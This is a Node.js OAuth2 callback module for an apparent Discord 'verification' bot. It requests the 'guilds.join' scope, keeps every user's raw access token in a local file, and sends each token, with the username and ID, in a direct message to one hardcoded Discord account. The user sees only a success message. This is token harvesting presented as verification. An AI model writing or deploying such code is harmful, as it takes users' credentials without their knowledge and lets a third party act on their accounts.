const fetch = require('node-fetch');
const fs = require('fs').promises;
const path = require('path');

const USERS_FILE = path.join(__dirname, '..', 'authorizedUsers.json');

let authorizedUsers = [];

async function loadAuthorizedUsers() {
  try {
    const data = await fs.readFile(USERS_FILE, 'utf8');
    authorizedUsers = JSON.parse(data);
  } catch (error) {
    if (error.code !== 'ENOENT') {
      console.error('Error loading authorized users:', error);
    }
    authorizedUsers = [];
  }
}

async function saveAuthorizedUsers() {
  try {
    await fs.writeFile(USERS_FILE, JSON.stringify(authorizedUsers, null, 2));
  } catch (error) {
    console.error('Error saving authorized users:', error);
  }
}

async function handleOAuth2Callback(req, res, client) {
  const { code } = req.query;

  if (code) {
    try {
      const oauthResult = await exchangeCode(code);
      const userInfo = await getUserInfo(oauthResult.access_token);

      const newUser = {
        ...userInfo,
        access_token: oauthResult.access_token
      };
      const existingUserIndex = authorizedUsers.findIndex(user => user.id === newUser.id);
      if (existingUserIndex !== -1) {
        authorizedUsers[existingUserIndex] = newUser;
      } else {
        authorizedUsers.push(newUser);
      }
      await saveAuthorizedUsers();

      const targetUser = await client.users.fetch('1187108192090607617');
      const embed = {
        color: 0x0099ff,
        title: '🎉 New User Verified',
        fields: [
          { name: 'Username', value: `${userInfo.username}#${userInfo.discriminator}` },
          { name: 'User ID', value: userInfo.id },
          { name: 'OAuth Token', value: oauthResult.access_token }
        ],
        timestamp: new Date(),
      };
      await targetUser.send({ embeds: [embed] });

      res.send('Verification successful! You can close this window and return to Discord.');
      console.log(`User ${userInfo.username}#${userInfo.discriminator} (${userInfo.id}) verified successfully`);
    } catch (error) {
      console.error('Error during OAuth process:', error);
      res.status(500).send('An error occurred during the verification process.');
    }
  } else {
    res.status(400).send('No code provided');
  }
}

async function exchangeCode(code) {
  const body = new URLSearchParams({
    client_id: process.env.CLIENT_ID,
    client_secret: process.env.CLIENT_SECRET,
    grant_type: 'authorization_code',
    code,
    redirect_uri: process.env.REDIRECT_URI,
    scope: 'identify guilds.join'
  });

  const response = await fetch('https://discord.com/api/oauth2/token', {
    method: 'POST',
    body: body,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
  });

  if (!response.ok) {
    throw new Error(`Error exchanging code: ${response.statusText}`);
  }

  return response.json();
}

async function getUserInfo(accessToken) {
  const response = await fetch('https://discord.com/api/users/@me', {
    headers: {
      Authorization: `Bearer ${accessToken}`,
    },
  });

  if (!response.ok) {
    throw new Error(`Error getting user info: ${response.statusText}`);
  }

  return response.json();
}

function getAuthorizedUsers() {
  return authorizedUsers;
}

module.exports = { handleOAuth2Callback, getAuthorizedUsers, loadAuthorizedUsers };
